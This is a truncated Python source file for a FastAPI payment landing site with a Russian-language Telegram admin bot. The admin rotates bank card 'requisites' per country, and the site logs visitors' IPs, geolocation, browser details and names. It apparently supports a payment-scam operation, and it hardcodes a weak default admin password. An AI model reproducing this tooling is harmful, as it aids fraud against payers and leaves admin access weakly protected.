import ipaddress
import os
import re
import secrets
import sqlite3
from contextlib import asynccontextmanager
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Any
from urllib.parse import urlencode

import httpx
from fastapi import FastAPI, HTTPException, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import FileResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel
from telegram import ReplyKeyboardMarkup, Update
from telegram.ext import (
    Application,
    CommandHandler,
    ContextTypes,
    ConversationHandler,
    MessageHandler,
    filters,
)

# --- PATHS & CONFIG ---
BASE_DIR = Path(__file__).resolve().parent
STATIC_DIR = BASE_DIR / "static"
DB_FILE = BASE_DIR / "database.sqlite"


def parse_optional_int(raw_value: str, default: int | None = None) -> int | None:
    value = (raw_value or "").strip()
    if not value:
        return default
    try:
        return int(value)
    except ValueError:
        return default


BOT_TOKEN = os.getenv("BOT_TOKEN", "").strip()
ADMIN_ID = parse_optional_int(os.getenv("ADMIN_ID", ""))
WEB_URL = os.getenv("WEB_URL", "http://localhost:8000").rstrip("/")
DEFAULT_CURRENCY = "EUR"
DEFAULT_REFRESH_MINUTES = max(1, parse_optional_int(os.getenv("DEFAULT_REFRESH_MINUTES", ""), 15) or 15)
DEFAULT_PREVIEW_AMOUNT = 250.0
ALLOW_PREVIEW_MODE = os.getenv("ALLOW_PREVIEW_MODE", "").strip().lower() in {"1", "true", "yes", "on"}
CLIENT_NAME_MAX_LENGTH = 80

BOT_ENABLED = bool(BOT_TOKEN)
WAITING_GEO_SELECTION = 1
WAITING_REQUISITES = 2
WAITING_MANAGER = 3
WAITING_LINK_AMOUNT = 4
WAITING_LINK_LABEL = 5

ADMIN_USERNAME = os.getenv("ADMIN_USERNAME", "telegram-dream-team")
ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD", "12345qwert!@#$%QWERT")
SESSION_COOKIE_NAME = "payment_admin_session"
SESSION_TTL_HOURS = 12

ADMIN_SESSIONS: dict[str, datetime] = {}
GEO_CACHE: dict[str, dict[str, Any]] = {}
BOT_RUNTIME_STARTED = False
BOT_RUNTIME_ERROR: str | None = None

LANGUAGE_OPTIONS = [
    {"code": "en", "label": "English"},
    {"code": "ru", "label": "Русский"},
    {"code": "es", "label": "Español"},
    {"code": "it", "label": "Italiano"},
    {"code": "de", "label": "Deutsch"},
    {"code": "fr", "label": "Français"},
]
LANDING_LANGUAGE_SET = {item["code"] for item in LANGUAGE_OPTIONS}
LANGUAGE_TO_GEO_MAP = {
    "es": "ES",
    "ca": "ES",
    "eu": "ES",
    "gl": "ES",
    "it": "IT",
    "de": "DE",
    "fr": "FR",
}
SPECIAL_LANGUAGE_MAP = {
    "nb": "no",
    "nn": "no",
}
DEFAULT_GEO_CONFIGS = {
    "ES": {
        "geo_name": "Spain",
        "default_language": "es",
        "manager_name": "Spain manager",
        "manager_telegram_url": "",
        "refresh_minutes": DEFAULT_REFRESH_MINUTES,
    },
    "IT": {
        "geo_name": "Italy",
        "default_language": "it",
        "manager_name": "Italy manager",
        "manager_telegram_url": "",
        "refresh_minutes": DEFAULT_REFRESH_MINUTES,
    },
    "DE": {
        "geo_name": "Germany",
        "default_language": "de",
        "manager_name": "Germany manager",
        "manager_telegram_url": "",
        "refresh_minutes": DEFAULT_REFRESH_MINUTES,
    },
    "FR": {
        "geo_name": "France",
        "default_language": "fr",
        "manager_name": "France manager",
        "manager_telegram_url": "",
        "refresh_minutes": DEFAULT_REFRESH_MINUTES,
    },
}
SUPPORTED_GEOS = tuple(DEFAULT_GEO_CONFIGS.keys())
SUPPORTED_GEO_SET = set(SUPPORTED_GEOS)


class AdminLoginPayload(BaseModel):
    username: str
    password: str


class GeoConfigPayload(BaseModel):
    geo_name: str
    default_language: str
    manager_name: str
    manager_telegram_url: str = ""
    refresh_minutes: int
    bank_name: str
    card_number: str
    receiver_name: str


class LandingClientPayload(BaseModel):
    visit_token: str
    first_name: str
    last_name: str


def utc_now() -> datetime:
    return datetime.now(timezone.utc)


def utc_now_iso() -> str:
    return utc_now().isoformat()


def get_connection() -> sqlite3.Connection:
    conn = sqlite3.connect(DB_FILE)
    conn.row_factory = sqlite3.Row
    return conn


def row_to_dict(row: sqlite3.Row | None) -> dict[str, Any] | None:
    return dict(row) if row is not None else None


def table_exists(conn: sqlite3.Connection, table_name: str) -> bool:
    row = conn.execute(
        "SELECT name FROM sqlite_master WHERE type = 'table' AND name = ?",
        (table_name,),
    ).fetchone()
    return row is not None


def ensure_column(conn: sqlite3.Connection, table_name: str, column_name: str, definition: str) -> None:
    columns = {row["name"] for row in conn.execute(f"PRAGMA table_info({table_name})")}
    if column_name not in columns:
        conn.execute(f"ALTER TABLE {table_name} ADD COLUMN {column_name} {definition}")


def sanitize_geo_code(value: str | None) -> str | None:
    code = (value or "").strip().upper()
    return code if code in SUPPORTED_GEO_SET else None


def sanitize_language_code(value: str | None) -> str | None:
    code = (value or "").strip().lower()
    return code if code in LANDING_LANGUAGE_SET else None


def normalize_language_code(value: str | None) -> str | None:
    if not value:
        return None
    normalized = value.strip().lower().replace("_", "-")
    normalized = normalized.split(",")[0].split(";")[0]
    code = normalized.split("-")[0]
    code = SPECIAL_LANGUAGE_MAP.get(code, code)
    return code or None


def clean_client_name(raw_value: str | None) -> str:
    value = re.sub(r"\s+", " ", (raw_value or "").strip())
    return value[:CLIENT_NAME_MAX_LENGTH]


def parse_payment_amount(raw_value: str | None) -> float | None:
    if raw_value is None:
        return None
    normalized = raw_value.strip().replace(",", ".")
    if not normalized:
        return None
    try:
        amount = float(normalized)
    except ValueError:
        return None
    if amount <= 0:
        return None
    return round(amount, 2)


def format_query_amount(amount: float) -> str:
    return f"{amount:.2f}".rstrip("0").rstrip(".")


def build_payment_link(amount: float, geo_code: str, label: str = "") -> str:
    safe_geo = sanitize_geo_code(geo_code) or "ES"
    params = {
        "payment": format_query_amount(amount),
        "geo": safe_geo,
    }
    clean_label = label.strip()
    if clean_label:
        params["label"] = clean_label
    return f"{WEB_URL}/?{urlencode(params)}"


def resolve_geo_code(requested_geo: str | None, country_code: str | None, browser_language: str | None) -> str:
    explicit_geo = sanitize_geo_code(requested_geo)
    if explicit_geo:
        return explicit_geo

    visitor_country = (country_code or "").strip().upper()
    if visitor_country in SUPPORTED_GEO_SET:
        return visitor_country

    mapped_geo = LANGUAGE_TO_GEO_MAP.get((browser_language or "").strip().lower())
    if mapped_geo:
        return mapped_geo

    return "ES"


def legacy_seed_requisites(conn: sqlite3.Connection) -> dict[str, str]:
    if table_exists(conn, "requisites"):
        row = conn.execute(
            """
            SELECT bank_name, card_number, receiver_name
            FROM requisites
            ORDER BY id DESC
            LIMIT 1
            """
        ).fetchone()
        if row:
            return dict(row)
    return {
        "bank_name": "Dream Team Pay",
        "card_number": "0000 0000 0000 0000",
        "receiver_name": "Payment Operations",
    }


def seed_geo_data(conn: sqlite3.Connection) -> None:
    now_value = utc_now_iso()
    default_requisites = legacy_seed_requisites(conn)
    for geo_code, config in DEFAULT_GEO_CONFIGS.items():
        conn.execute(
            """
            INSERT OR IGNORE INTO geo_profiles (
                geo_code, geo_name, default_language, manager_name, manager_telegram_url,
                refresh_minutes, updated_at
            )
            VALUES (?, ?, ?, ?, ?, ?, ?)
            """,
            (
                geo_code,
                config["geo_name"],
                config["default_language"],
                config["manager_name"],
                config["manager_telegram_url"],
                config["refresh_minutes"],
                now_value,
            ),
        )

        row = conn.execute(
            "SELECT COUNT(*) AS value FROM geo_requisites WHERE geo_code = ?",
            (geo_code,),
        ).fetchone()
        if row and row["value"] == 0:
            conn.execute(
                """
                INSERT INTO geo_requisites (geo_code, bank_name, card_number, receiver_name, created_at)
                VALUES (?, ?, ?, ?, ?)
                """,
                (
                    geo_code,
                    default_requisites["bank_name"],
                    default_requisites["card_number"],
                    default_requisites["receiver_name"],
                    now_value,
                ),
            )


def init_db() -> None:
    conn = get_connection()
    conn.execute(
        """
        CREATE TABLE IF NOT EXISTS geo_profiles (
            geo_code TEXT PRIMARY KEY,
            geo_name TEXT NOT NULL,
            default_language TEXT NOT NULL,
            manager_name TEXT NOT NULL,
            manager_telegram_url TEXT,
            refresh_minutes INTEGER NOT NULL DEFAULT 15,
            updated_at TEXT
        )
        """
    )
    conn.execute(
        """
        CREATE TABLE IF NOT EXISTS geo_requisites (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            geo_code TEXT NOT NULL,
            bank_name TEXT NOT NULL,
            card_number TEXT NOT NULL,
            receiver_name TEXT NOT NULL,
            created_at TEXT
        )
        """
    )
    conn.execute(
        """
        CREATE INDEX IF NOT EXISTS idx_geo_requisites_lookup
        ON geo_requisites (geo_code, id DESC)
        """
    )
    conn.execute(
        """
        CREATE TABLE IF NOT EXISTS visits (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            mode TEXT,
            ip_address TEXT,
            country_code TEXT,
            country_name TEXT,
            city TEXT,
            region TEXT,
            timezone TEXT,
            currency TEXT,
            user_agent TEXT,
            accept_language TEXT,
            recommended_language TEXT,
            geo_code TEXT,
            payment_amount REAL,
            payment_label TEXT,
            referrer TEXT,
            page_path TEXT,
            query_string TEXT,
            created_at TEXT
        )
        """
    )

    ensure_column(conn, "visits", "geo_code", "TEXT")
    ensure_column(conn, "visits", "payment_amount", "REAL")
    ensure_column(conn, "visits", "payment_label", "TEXT")
    ensure_column(conn, "visits", "visit_token", "TEXT")
    ensure_column(conn, "visits", "client_first_name", "TEXT")
    ensure_column(conn, "visits", "client_last_name", "TEXT")
    ensure_column(conn, "visits", "client_saved_at", "TEXT")
    ensure_column(conn, "visits", "requisites_id", "INTEGER")
    ensure_column(conn, "visits", "snapshot_bank_name", "TEXT")
    ensure_column(conn, "visits", "snapshot_card_number", "TEXT")
    ensure_column(conn, "visits", "snapshot_receiver_name", "TEXT")
    conn.execute(
        """
        CREATE INDEX IF NOT EXISTS idx_visits_visit_token
        ON visits (visit_token)
        """
    )
    seed_geo_data(conn)
    conn.commit()
    conn.close()


def get_geo_profile(geo_code: str) -> dict[str, Any]:
    safe_geo = sanitize_geo_code(geo_code) or "ES"
    conn = get_connection()
    row = conn.execute(
        """
        SELECT
            geo_code, geo_name, default_language, manager_name, manager_telegram_url,
            refresh_minutes, updated_at
        FROM geo_profiles
        WHERE geo_code = ?
        """,
        (safe_geo,),
    ).fetchone()
    conn.close()
    if row:
        return dict(row)

    fallback = DEFAULT_GEO_CONFIGS[safe_geo]
    return {
        "geo_code": safe_geo,
        "geo_name": fallback["geo_name"],
        "default_language": fallback["default_language"],
        "manager_name": fallback["manager_name"],
        "manager_telegram_url": fallback["manager_telegram_url"],
        "refresh_minutes": fallback["refresh_minutes"],
        "updated_at": utc_now_iso(),
    }


def list_geo_profiles() -> list[dict[str, Any]]:
    conn = get_connection()
    rows = conn.execute(
        """
        SELECT
            geo_code, geo_name, default_language, manager_name, manager_telegram_url,
            refresh_minutes, updated_at
        FROM geo_profiles
        ORDER BY geo_code ASC
        """
    ).fetchall()
    conn.close()
    profiles_by_code = {row["geo_code"]: dict(row) for row in rows}
    return [profiles_by_code.get(geo_code, get_geo_profile(geo_code)) for geo_code in SUPPORTED_GEOS]


def get_active_requisites(geo_code: str) -> dict[str, Any]:
    safe_geo = sanitize_geo_code(geo_code) or "ES"
    conn = get_connection()
    row = conn.execute(
        """
        SELECT id, geo_code, bank_name, card_number, receiver_name, created_at
        FROM geo_requisites
        WHERE geo_code = ?
        ORDER BY id DESC
        LIMIT 1
        """,
        (safe_geo,),
    ).fetchone()
    conn.close()
    if row:
        return dict(row)

    fallback_conn = get_connection()
    defaults = legacy_seed_requisites(fallback_conn)
    fallback_conn.close()
    return {
        "id": None,
        "geo_code": safe_geo,
        "bank_name": defaults["bank_name"],
        "card_number": defaults["card_number"],
        "receiver_name": defaults["receiver_name"],
        "created_at": utc_now_iso(),
    }


def list_geo_snapshots() -> list[dict[str, Any]]:
    return [
        {
            "profile": get_geo_profile(geo_code),
            "active_requisites": get_active_requisites(geo_code),
        }
        for geo_code in SUPPORTED_GEOS
    ]


def list_geo_requisites_history(limit: int = 40) -> list[dict[str, Any]]:
    conn = get_connection()
    rows = conn.execute(
        """
        SELECT id, geo_code, bank_name, card_number, receiver_name, created_at
        FROM geo_requisites
        ORDER BY id DESC
        LIMIT ?
        """,
        (limit,),
    ).fetchall()
    conn.close()
    return [dict(row) for row in rows]


def save_geo_configuration(geo_code: str, payload: GeoConfigPayload) -> dict[str, Any]:
    safe_geo = sanitize_geo_code(geo_code)
    if not safe_geo:
        raise HTTPException(status_code=400, detail="Неподдерживаемый GEO")

    geo_name = payload.geo_name.strip() or DEFAULT_GEO_CONFIGS[safe_geo]["geo_name"]
    default_language = sanitize_language_code(payload.default_language) or DEFAULT_GEO_CONFIGS[safe_geo]["default_language"]
    manager_name = payload.manager_name.strip() or DEFAULT_GEO_CONFIGS[safe_geo]["manager_name"]
    manager_telegram_url = payload.manager_telegram_url.strip()
    refresh_minutes = int(payload.refresh_minutes)
    bank_name = payload.bank_name.strip()
    card_number = payload.card_number.strip()
    receiver_name = payload.receiver_name.strip()

    if not bank_name or not card_number or not receiver_name:
        raise HTTPException(status_code=400, detail="Реквизиты должны быть заполнены полностью")
    if refresh_minutes < 1 or refresh_minutes > 120:
        raise HTTPException(status_code=400, detail="Таймер должен быть от 1 до 120 минут")

    conn = get_connection()
    conn.execute(
        """
        UPDATE geo_profiles
        SET
            geo_name = ?,
            default_language = ?,
            manager_name = ?,
            manager_telegram_url = ?,
            refresh_minutes = ?,
            updated_at = ?
        WHERE geo_code = ?
        """,
        (
            geo_name,
            default_language,
            manager_name,
            manager_telegram_url,
            refresh_minutes,
            utc_now_iso(),
            safe_geo,
        ),
    )

    current_requisites = conn.execute(
        """
        SELECT bank_name, card_number, receiver_name
        FROM geo_requisites
        WHERE geo_code = ?
        ORDER BY id DESC
        LIMIT 1
        """,
        (safe_geo,),
    ).fetchone()
    if (
        current_requisites is None
        or current_requisites["bank_name"] != bank_name
        or current_requisites["card_number"] != card_number
        or current_requisites["receiver_name"] != receiver_name
    ):
        conn.execute(
            """
            INSERT INTO geo_requisites (geo_code, bank_name, card_number, receiver_name, created_at)
            VALUES (?, ?, ?, ?, ?)
            """,
            (safe_geo, bank_name, card_number, receiver_name, utc_now_iso()),
        )

    conn.commit()
    conn.close()
    return {
        "profile": get_geo_profile(safe_geo),
        "active_requisites": get_active_requisites(safe_geo),
    }


def update_geo_requisites(geo_code: str, bank_name: str, card_number: str, receiver_name: str) -> dict[str, Any]:
    safe_geo = sanitize_geo_code(geo_code) or "ES"
    clean_bank = bank_name.strip()
    clean_card = card_number.strip()
    clean_receiver = receiver_name.strip()
    if not clean_bank or not clean_card or not clean_receiver:
        raise HTTPException(status_code=400, detail="Нужно указать банк, карту/счет и получателя")

    conn = get_connection()
    conn.execute(
        """
        INSERT INTO geo_requisites (geo_code, bank_name, card_number, receiver_name, created_at)
        VALUES (?, ?, ?, ?, ?)
        """,
        (safe_geo, clean_bank, clean_card, clean_receiver, utc_now_iso()),
    )
    conn.commit()
    conn.close()
    return get_active_requisites(safe_geo)


def update_geo_manager(geo_code: str, manager_name: str, manager_telegram_url: str) -> dict[str, Any]:
    safe_geo = sanitize_geo_code(geo_code) or "ES"
    clean_name = manager_name.strip() or DEFAULT_GEO_CONFIGS[safe_geo]["manager_name"]
    clean_url = manager_telegram_url.strip()
    conn = get_connection()
    conn.execute(
        """
        UPDATE geo_profiles
        SET manager_name = ?, manager_telegram_url = ?, updated_at = ?
        WHERE geo_code = ?
        """,
        (clean_name, clean_url, utc_now_iso(), safe_geo),
    )
    conn.commit()
    conn.close()
    return get_geo_profile(safe_geo)


def record_visit(
    mode: str,
    visitor: dict[str, Any],
    recommended_language: str,
    geo_code: str,
    payment_amount: float | None,
    payment_label: str | None,
    requisites: dict[str, Any] | None,
    request: Request,
) -> str:
    visit_token = secrets.token_urlsafe(18)
    conn = get_connection()
    conn.execute(
        """
        INSERT INTO visits (
            mode, ip_address, country_code, country_name, city, region, timezone, currency,
            user_agent, accept_language, recommended_language, geo_code, payment_amount,
            payment_label, referrer, page_path, query_string, created_at, visit_token,
            client_first_name, client_last_name, client_saved_at, requisites_id,
            snapshot_bank_name, snapshot_card_number, snapshot_receiver_name
        )
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        """,
        (
            mode,
            visitor.get("ip_address"),
            visitor.get("country_code"),
            visitor.get("country_name"),
            visitor.get("city"),
            visitor.get("region"),
            visitor.get("timezone"),
            visitor.get("currency"),
            visitor.get("user_agent"),
            visitor.get("accept_language"),
            recommended_language,
            geo_code,
            payment_amount,
            payment_label or None,
            visitor.get("referrer"),
            str(request.url.path),
            request.url.query,
            utc_now_iso(),
            visit_token,
            None,
            None,
            None,
            requisites.get("id") if requisites else None,
            requisites.get("bank_name") if requisites else None,
            requisites.get("card_number") if requisites else None,
            requisites.get("receiver_name") if requisites else None,
        ),
    )
    conn.commit()
    conn.close()
    return visit_token


def list_visits(limit: int = 120) -> list[dict[str, Any]]:
    conn = get_connection()
    rows = conn.execute(
        """
        SELECT
            id, mode, ip_address, country_code, country_name, city, region, timezone,
            currency, user_agent, accept_language, recommended_language, geo_code,
            payment_amount, payment_label, referrer, page_path, query_string, created_at,
            visit_token, client_first_name, client_last_name, client_saved_at,
            requisites_id, snapshot_bank_name, snapshot_card_number, snapshot_receiver_name
        FROM visits
        ORDER BY id DESC
        LIMIT ?
        """,
        (limit,),
    ).fetchall()
    conn.close()
    return [dict(row) for row in rows]


def save_landing_client(visit_token: str, first_name: str, last_name: str) -> dict[str, Any]:
    clean_token = (visit_token or "").strip()
    clean_first_name = clean_client_name(first_name)
    clean_last_name = clean_client_name(last_name)

    if not clean_token:
        raise HTTPException(status_code=400, detail="Отсутствует токен визита")
    if not clean_first_name or not clean_last_name:
        raise HTTPException(status_code=400, detail="Имя и фамилия обязательны")

    conn = get_connection()
    cursor = conn.execute(
        """
        UPDATE visits
        SET client_first_name = ?, client_last_name = ?, client_saved_at = ?
        WHERE visit_token = ?
        """,
        (clean_first_name, clean_last_name, utc_now_iso(), clean_token),
    )
    if cursor.rowcount == 0:
        conn.close()
        raise HTTPException(status_code=404, detail="Визит не найден")

    row = conn.execute(
        """
        SELECT visit_token, client_first_name, client_last_name, client_saved_at
        FROM visits
        WHERE visit_token = ?
        LIMIT 1
        """,
        (clean_token,),
    ).fetchone()
    conn.commit()
    conn.close()
    return dict(row) if row is not None else {
        "visit_token": clean_token,
        "client_first_name": clean_first_name,
        "client_last_name": clean_last_name,
        "client_saved_at": utc_now_iso(),
    }


def get_summary_stats() -> dict[str, Any]:
    conn = get_connection()
    today_start = datetime.now(timezone.utc).date().isoformat()

    visits_total = conn.execute("SELECT COUNT(*) AS value FROM visits").fetchone()["value"]
    visits_today = conn.execute(
        "SELECT COUNT(*) AS value FROM visits WHERE created_at >= ?",
        (today_start,),
    ).fetchone()["value"]
    unique_ips = conn.execute(
        "SELECT COUNT(DISTINCT ip_address) AS value FROM visits WHERE ip_address IS NOT NULL AND ip_address != ''"
    ).fetchone()["value"]
    preview_visits = conn.execute("SELECT COUNT(*) AS value FROM visits WHERE mode = 'preview'").fetchone()["value"]
    live_visits = conn.execute("SELECT COUNT(*) AS value FROM visits WHERE mode = 'live'").fetchone()["value"]
    configured_geos = conn.execute("SELECT COUNT(*) AS value FROM geo_profiles").fetchone()["value"]
    manager_links_configured = conn.execute(
        """
        SELECT COUNT(*) AS value
        FROM geo_profiles
        WHERE manager_telegram_url IS NOT NULL AND TRIM(manager_telegram_url) != ''
        """
    ).fetchone()["value"]

    top_countries_rows = conn.execute(
        """
        SELECT COALESCE(country_name, country_code, 'Unknown') AS label, COUNT(*) AS count_value
        FROM visits
        GROUP BY COALESCE(country_name, country_code, 'Unknown')
        ORDER BY count_value DESC
        LIMIT 8
        """
    ).fetchall()
    top_languages_rows = conn.execute(
        """
        SELECT COALESCE(recommended_language, 'unknown') AS label, COUNT(*) AS count_value
        FROM visits
        GROUP BY COALESCE(recommended_language, 'unknown')
        ORDER BY count_value DESC
        LIMIT 8
        """
    ).fetchall()
    top_geos_rows = conn.execute(
        """
        SELECT COALESCE(geo_code, 'Unknown') AS label, COUNT(*) AS count_value
        FROM visits
        GROUP BY COALESCE(geo_code, 'Unknown')
        ORDER BY count_value DESC
        LIMIT 8
        """
    ).fetchall()
    conn.close()

    return {
        "visits_total": visits_total,
        "visits_today": visits_today,
        "unique_ips": unique_ips,
        "preview_visits": preview_visits,
        "live_visits": live_visits,
        "configured_geos": configured_geos,
        "manager_links_configured": manager_links_configured,
        "top_countries": [{"label": row["label"], "count": row["count_value"]} for row in top_countries_rows],
        "top_languages": [{"label": row["label"], "count": row["count_value"]} for row in top_languages_rows],
        "top_geos": [{"label": row["label"], "count": row["count_value"]} for row in top_geos_rows],
    }


def cleanup_sessions() -> None:
    now_value = utc_now()
    expired_tokens = [
        token
        for token, created_at in ADMIN_SESSIONS.items()
        if created_at + timedelta(hours=SESSION_TTL_HOURS) < now_value
    ]
    for token in expired_tokens:
        ADMIN_SESSIONS.pop(token, None)


def create_admin_session() -> str:
    cleanup_sessions()
    token = secrets.token_urlsafe(32)
    ADMIN_SESSIONS[token] = utc_now()
    return token


def ensure_admin_session(request: Request) -> None:
    cleanup_sessions()
    token = request.cookies.get(SESSION_COOKIE_NAME)
    if not token or token not in ADMIN_SESSIONS:
        raise HTTPException(status_code=401, detail="Unauthorized")


def extract_client_ip(request: Request) -> str:
    for header_name in ("cf-connecting-ip", "x-real-ip", "x-forwarded-for"):
        header_value = request.headers.get(header_name, "").strip()
        if header_value:
            return header_value.split(",")[0].strip()
    if request.client and request.client.host:
        return request.client.host
    return "unknown"


def is_public_ip(ip_address: str) -> bool:
    try:
        parsed = ipaddress.ip_address(ip_address)
        return not (
            parsed.is_private
            or parsed.is_loopback
            or parsed.is_reserved
            or parsed.is_multicast
            or parsed.is_unspecified
        )
    except ValueError:
        return False


async def fetch_geo_for_ip(ip_address: str) -> dict[str, Any]:
    if not ip_address or not is_public_ip(ip_address):
        return {}

    cached = GEO_CACHE.get(ip_address)
    if cached:
        return cached

    try:
        async with httpx.AsyncClient(timeout=1.8) as client:
            response = await client.get(f"https://ipwho.is/{ip_address}")
            response.raise_for_status()
            payload = response.json()
    except Exception:
        return {}

    if not payload.get("success"):
        return {}

    timezone_payload = payload.get("timezone") or {}
    currency_payload = payload.get("currency") or {}
    geo_data = {
        "country_code": (payload.get("country_code") or "").upper(),
        "country_name": payload.get("country") or "",
        "city": payload.get("city") or "",
        "region": payload.get("region") or "",
        "timezone": timezone_payload.get("id") or "",
        "currency": currency_payload.get("code") or "",
    }
    GEO_CACHE[ip_address] = geo_data
    return geo_data


async def build_visitor_context(request: Request) -> tuple[dict[str, Any], str | None]:
    ip_address = extract_client_ip(request)
    visitor = {
        "ip_address": ip_address,
        "country_code": (
            request.headers.get("cf-ipcountry")
            or request.headers.get("x-vercel-ip-country")
            or request.headers.get("cloudfront-viewer-country")
            or request.headers.get("x-country-code")
            or ""
        ).upper(),
        "country_name": "",
        "city": request.headers.get("x-vercel-ip-city", "") or request.headers.get("x-city", ""),
        "region": request.headers.get("x-vercel-ip-country-region", "") or request.headers.get("x-region", ""),
        "timezone": request.headers.get("x-vercel-ip-timezone", "") or request.headers.get("x-timezone", ""),
        "currency": "",
        "user_agent": request.headers.get("user-agent", ""),
        "accept_language": request.headers.get("accept-language", ""),
        "referrer": request.headers.get("referer", ""),
    }

    geo_data = await fetch_geo_for_ip(ip_address)
    for key, value in geo_data.items():
        if not visitor.get(key):
            visitor[key] = value

    browser_language = normalize_language_code(visitor["accept_language"])
    return visitor, browser_language


init_db()

# --- TELEGRAM BOT ---
bot_app = Application.builder().token(BOT_TOKEN).build() if BOT_ENABLED else None


def get_bot_status() -> dict[str, Any]:
    runtime_running = False
    updater_running = False

    if bot_app is not None:
        runtime_running = bool(getattr(bot_app, "running", False))
        updater = getattr(bot_app, "updater", None)
        updater_running = bool(updater and getattr(updater, "running", False))

    return {
        "enabled": BOT_ENABLED,
        "admin_id_configured": ADMIN_ID is not None,
        "runtime_started": BOT_RUNTIME_STARTED,
        "app_running": runtime_running,
        "updater_running": updater_running,
        "control_panel_ready": BOT_ENABLED and ADMIN_ID is not None and BOT_RUNTIME_STARTED,
        "web_url": WEB_URL,
        "error": BOT_RUNTIME_ERROR,
    }


def get_selected_geo(context: ContextTypes.DEFAULT_TYPE) -> str:
    selected_geo = sanitize_geo_code(str(context.user_data.get("selected_geo", "ES")))
    return selected_geo or "ES"


def main_keyboard() -> ReplyKeyboardMarkup:
    return ReplyKeyboardMarkup(
        [
            ["🗺 Выбрать GEO", "📊 GEO статус"],
            ["📝 Реквизиты", "👤 Менеджер"],
            ["🔗 Ссылка на оплату"],
        ],
        resize_keyboard=True,
    )


def geo_picker_keyboard() -> ReplyKeyboardMarkup:
    return ReplyKeyboardMarkup([["ES", "IT"], ["DE", "FR"]], resize_keyboard=True, one_time_keyboard=True)


def build_geo_details_text(geo_code: str) -> str:
    profile = get_geo_profile(geo_code)
    requisites = get_active_requisites(geo_code)
    manager_link = profile["manager_telegram_url"] or "не указан"
    return (
        f"GEO: {profile['geo_code']} ({profile['geo_name']})\n"
        f"Язык по умолчанию: {profile['default_language']}\n"
        f"Таймер: {profile['refresh_minutes']} мин\n"
        f"Менеджер: {profile['manager_name']}\n"
        f"Telegram: {manager_link}\n\n"
        f"Банк: {requisites['bank_name']}\n"
        f"Карта / счет: {requisites['card_number']}\n"
        f"Получатель: {requisites['receiver_name']}"
    )


def build_geo_overview_text() -> str:
    blocks = ["Активные GEO-конфигурации:"]
    for snapshot in list_geo_snapshots():
        profile = snapshot["profile"]
        requisites = snapshot["active_requisites"]
        manager_status = "есть ссылка" if profile["manager_telegram_url"] else "ссылка не задана"
        blocks.append(
            f"\n{profile['geo_code']} | {profile['geo_name']} | {profile['default_language']} | "
            f"таймер {profile['refresh_minutes']} мин | менеджер: {manager_status}\n"
            f"{requisites['bank_name']} | {requisites['card_number']} | {requisites['receiver_name']}"
        )
    return "\n".join(blocks)


async def admin_check(update: Update) -> bool:
    message = update.effective_message
    if message is None:
        return False
    if ADMIN_ID is None:
        await message.reply_text("ADMIN_ID еще не настроен в окружении.")
        return False
    if update.effective_user is None or update.effective_user.id != ADMIN_ID:
        await message.reply_text("Нет доступа. Вы не администратор.")
        return False
    return True


async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await admin_check(update):
        return
    selected_geo = get_selected_geo(context)
    await update.effective_message.reply_text(
        "Внутренняя панель команды активна.\n\n"
        f"Текущий выбранный GEO: {selected_geo}\n\n"
        f"{build_geo_details_text(selected_geo)}",
        reply_markup=main_keyboard(),
    )


async def show_geo_status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await admin_check(update):
        return
    await update.effective_message.reply_text(build_geo_overview_text(), reply_markup=main_keyboard())


async def select_geo_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not await admin_check(update):
        return ConversationHandler.END
    selected_geo = get_selected_geo(context)
    await update.effective_message.reply_text(
        f"Текущий GEO: {selected_geo}\nВыберите новый GEO.",
        reply_markup=geo_picker_keyboard(),
    )
    return WAITING_GEO_SELECTION


async def select_geo_save(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    geo_code = sanitize_geo_code(update.effective_message.text)
    if not geo_code:
        await update.effective_message.reply_text("Поддерживаются только ES, IT, DE и FR.")
        return WAITING_GEO_SELECTION

    context.user_data["selected_geo"] = geo_code
    await update.effective_message.reply_text(
        f"GEO переключен на {geo_code}.\n\n{build_geo_details_text(geo_code)}",
        reply_markup=main_keyboard(),
    )
    return ConversationHandler.END


async def change_reqs_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not await admin_check(update):
        return ConversationHandler.END
    selected_geo = get_selected_geo(context)
    requisites = get_active_requisites(selected_geo)
    await update.effective_message.reply_text(
        f"Текущий GEO: {selected_geo}\n"
        f"Банк: {requisites['bank_name']}\n"
        f"Карта / счет: {requisites['card_number']}\n"
        f"Получатель: {requisites['receiver_name']}\n\n"
        "Отправьте новые реквизиты тремя строками:\n"
        "Банк\n"
        "Карта или счет\n"
        "Получатель"
    )
    return WAITING_REQUISITES


async def change_reqs_save(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    lines = [line.strip() for line in update.effective_message.text.strip().splitlines() if line.strip()]
    if len(lines) < 3:
        await update.effective_message.reply_text("Нужно 3 строки: банк, карта/счет и получатель.")
        return WAITING_REQUISITES

    selected_geo = get_selected_geo(context)
    update_geo_requisites(selected_geo, lines[0], lines[1], lines[2])
    await update.effective_message.reply_text(
        f"Реквизиты для {selected_geo} обновлены.\n\n{build_geo_details_text(selected_geo)}",
        reply_markup=main_keyboard(),
    )
    return ConversationHandler.END


async def change_manager_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not await admin_check(update):
        return ConversationHandler.END
    selected_geo = get_selected_geo(context)
    profile = get_geo_profile(selected_geo)
    await update.effective_message.reply_text(
        f"Текущий GEO: {selected_geo}\n"
        f"Менеджер: {profile['manager_name']}\n"
        f"Telegram: {profile['manager_telegram_url'] or 'не указан'}\n\n"
        "Отправьте две строки:\n"
        "Имя менеджера\n"
        "Telegram-ссылка менеджера\n\n"
        "Чтобы очистить ссылку, отправьте во второй строке знак -"
    )
    return WAITING_MANAGER


async def change_manager_save(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    lines = [line.strip() for line in update.effective_message.text.strip().splitlines()]
    if len(lines) < 2 or not lines[0]:
